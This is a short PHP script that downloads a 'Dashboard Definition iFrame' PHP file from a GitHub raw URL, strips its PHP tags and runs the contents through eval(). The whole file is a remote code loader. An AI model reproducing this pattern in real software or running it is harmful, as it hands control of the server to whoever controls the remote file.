<?php

$url = "https://raw.githubusercontent.com/psepic/intembekoFiles/main/CIP%20-%20Dashboard%20Definition%20iFrame.php?token=".rand();

$content = file_get_contents($url);
$content = str_replace(['<?php', '?>'], "", $content);
$output = eval($content);

return $output;
